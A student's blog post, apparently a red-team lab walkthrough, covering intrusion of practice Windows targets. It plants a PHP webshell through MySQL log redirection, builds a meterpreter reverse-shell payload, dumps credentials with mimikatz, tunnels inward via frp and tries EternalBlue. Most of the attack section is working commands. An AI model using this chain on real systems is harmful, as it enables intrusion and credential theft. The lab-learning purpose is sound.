@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"studying-bo.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="红队靶机一练习注:因为后面要用到frp＋socket代理所以web服务器的一张网卡通向外网. 12攻击机:kali 靶机:web服务器 win2008和server win2k3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透">
+<meta property="og:url" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:site_name" content="~Welcome to My Blog~">
+<meta property="og:description" content="红队靶机一练习注:因为后面要用到frp＋socket代理所以web服务器的一张网卡通向外网. 12攻击机:kali 靶机:web服务器 win2008和server win2k3">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/1.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/2.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/3.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/4.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/5.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/6.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/7.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/8.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/9.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/10.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/11.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/12.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/13.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/14.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/15.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/16.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/17.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/18.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/19.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/20.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/21.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/22.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/23.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/24.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/25.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/26.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/27.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/28.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/29.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/30.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/31.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/32.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/33.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/34.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/35.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/36.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/37.png">
+<meta property="og:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/38.png">
+<meta property="article:published_time" content="2021-12-27T01:11:00.000Z">
+<meta property="article:modified_time" content="2021-12-26T16:16:23.391Z">
+<meta property="article:author" content="Bo Li">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="日志注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/1.png">
+
+<link rel="canonical" href="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>内网渗透 | ~Welcome to My Blog~</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">~Welcome to My Blog~</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-home fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://studying-bo.github.io/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/weixin.jpg">
+      <meta itemprop="name" content="Bo Li">
+      <meta itemprop="description" content="I am a computer student at school. This is my first blog. I will use it to record my training notes and learning contents. Welcome to visit and exchange learning">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="~Welcome to My Blog~">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          内网渗透
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-12-27 09:11:00 / 修改时间：00:16:23" itemprop="dateCreated datePublished" datetime="2021-12-27T09:11:00+08:00">2021-12-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">内网学习</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>3.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="红队靶机一练习"><a href="#红队靶机一练习" class="headerlink" title="红队靶机一练习"></a>红队靶机一练习</h3><p>注:因为后面要用到frp＋socket代理所以web服务器的一张网卡通向外网.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机:kali </span><br><span class="line">靶机:web服务器 win2008和server win2k3</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h4 id="前渗透"><a href="#前渗透" class="headerlink" title="前渗透"></a>前渗透</h4><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集:"></a>信息收集:</h5><p>对kali所在网段进行端口服务扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Netdiscover -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/1.png" class="">
+
+<p>成功扫描到目标主机,对目标主机进行端口扫描. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -sV -T4 192.168.159.137</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/2.png" class="">
+
+<p>发现目标主机开启了http服务尝试访问</p>
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/3.png" class="">
+
+<p>是phpinfo文件,获得到网站的绝对路径对后续渗入用处很大</p>
+<p>前面看到服务器开了mysql的默认端口3306尝试访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h192.168.159.137 -uroot -p</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/4.png" class="">
+
+<p>但是这里目标靶机数据库貌似禁用了远程连接的功能.</p>
+<p>使用dirsearch对网站进行目录扫描看是否能发现其他信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u &quot;http://192.168.159.137/&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/5.png" class="">
+
+<p>发现网站存在phpmyadmin数据库管理后台页面尝试访问一下</p>
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/6.png" class="">
+
+<p>尝试使用弱密码登录root root进行登录成功登录进去,查看是否有直接读写文件的权限.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;secure%&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/7.png" class="">
+
+<p>并没有,接着尝试通过写日志的方式写入一句话木马.开启日志,并写入一句话密码,然后通过菜刀或者蚁剑进行连接,这里通过蚁剑进行连接.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=‘on’;//开启日志功能</span><br><span class="line">set global general_log_file=’C:/phpStudy/5.php’;//将日志文件设为web目录下某文件</span><br><span class="line">select ‘&lt;?php assert($_POST[“admin”]);?&gt;’;</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/8.png" class="">
+
+<p>蚁剑的后渗透功能相对较少,这里我通过msfvenom生成一个exe文件进行后渗透.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.153 lpost=4455 -f exe -o 20.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/9.png" class="">
+
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/10.png" class="">
+
+<p>通过蚁剑将木马上传到目标主机</p>
+<p>攻击机开启监听.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler </span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/11.png" class="">
+
+<p>进入蚁剑的虚拟终端,因为目标机第一次启动20.exe文件所以当我们双击运行木马时会提示是否统一的窗口,我们需要同意防火墙默认允许此文件.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;20.exe&quot; dir=in action=allow program=&quot;C:\phpStudy\WWW\20.exe&quot; enable=yes</span><br></pre></td></tr></table></figure>
+
+<p>然后运行20.exe文件</p>
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/12.png" class="">
+
+<p>Kali成功监听到.</p>
+<h4 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure>
+
+<h5 id="迁移木马进程"><a href="#迁移木马进程" class="headerlink" title="迁移木马进程"></a>迁移木马进程</h5><p>查看权限为adminintrator权限,直接通过getsystem提升至system权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tasklist</span><br></pre></td></tr></table></figure>
+
+<h5 id="查看是否有杀软"><a href="#查看是否有杀软" class="headerlink" title="查看是否有杀软"></a>查看是否有杀软</h5><img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/13.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Systeminfo</span><br></pre></td></tr></table></figure>
+
+<h5 id="查看系统详细信息打的有什么补丁方便后续渗透"><a href="#查看系统详细信息打的有什么补丁方便后续渗透" class="headerlink" title="查看系统详细信息打的有什么补丁方便后续渗透"></a>查看系统详细信息打的有什么补丁方便后续渗透</h5><img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/14.png" class="">
+
+<p>查看是否存在域</p>
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/15.png" class="">
+
+<h5 id="存在域god"><a href="#存在域god" class="headerlink" title="存在域god"></a>存在域god</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot;   /domain          #查看域管理员</span><br></pre></td></tr></table></figure>
+
+<h6 id="获取本地管理员（通常包含域用户）信息"><a href="#获取本地管理员（通常包含域用户）信息" class="headerlink" title="获取本地管理员（通常包含域用户）信息"></a>获取本地管理员（通常包含域用户）信息</h6><img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/16.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view  /domain:god       # 查看局域网内其他主机名</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/17.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Load kiwi</span><br></pre></td></tr></table></figure>
+
+<h6 id="模块爆破密码"><a href="#模块爆破密码" class="headerlink" title="模块爆破密码"></a>模块爆破密码</h6><p>(原理:域管理员或其他用户使用自己的密码登录该计算机登录到域时,密码会存放在该计算机内存中,可以用kiwi模块中获取密码命令进行提取内存中的密码或者hash)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hashdump</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/18.png" class="">
+
+<p>爆破出了管理员的密码尝试进行登录发现提示管理员在线我们如果强行进行登录会引起对方怀疑.这里有两个思路.</p>
+<p>思路一:使用rdpwrap工具隐藏我们的远程连接绕过管理员连接到目标靶机进行渗透,这里因为考虑到目标机缺少缺少很多我们需要的工具,进行第二种思路.</p>
+<h5 id="kali挂代理通内网进行渗透"><a href="#kali挂代理通内网进行渗透" class="headerlink" title="kali挂代理通内网进行渗透"></a>kali挂代理通内网进行渗透</h5><p>因为我的msf不稳定挂代理总容易掉,这里我决定用frp＋sockets进行代理对内网进行渗透.</p>
+<p>先通过蚁剑给靶机远程下载frp工具并代理至我的公网服务器.</p>
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/19.png" class="">
+
+<p>服务器开启代理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x frps //给frps执行权限</span><br><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>
+
+<p>靶机进行连接.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/20.png" class="">
+
+<p>靶机成功连接上去</p>
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/21.png" class="">
+
+<h6 id="Kali将公网服务器ip加转发端口加入到代理链中"><a href="#Kali将公网服务器ip加转发端口加入到代理链中" class="headerlink" title="Kali将公网服务器ip加转发端口加入到代理链中"></a>Kali将公网服务器ip加转发端口加入到代理链中</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf  </span><br><span class="line">socket 代理服务器ip:端口号 //添加代理链</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/22.png" class="">
+
+<p>尝试通过内网ip访问一下web靶机可以成功访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://192.168.148.128/l.php&quot; </span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/23.png" class="">
+
+<p>通过代理打开msf进行横向渗透</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfdb run </span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/24.png" class="">
+
+<p>之前已经对内网存在的目标信息收集过直接进行攻击</p>
+<p>对192.168.148.129(域控所在服务器)主机进行端口扫描查看开启的服务`</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -Pn -sT -p80,445 192.168.148.1289</span><br></pre></td></tr></table></figure>
+
+<p>发现其开启了445端口尝试进行永恒之蓝攻击,结果一不小心打蓝屏了</p>
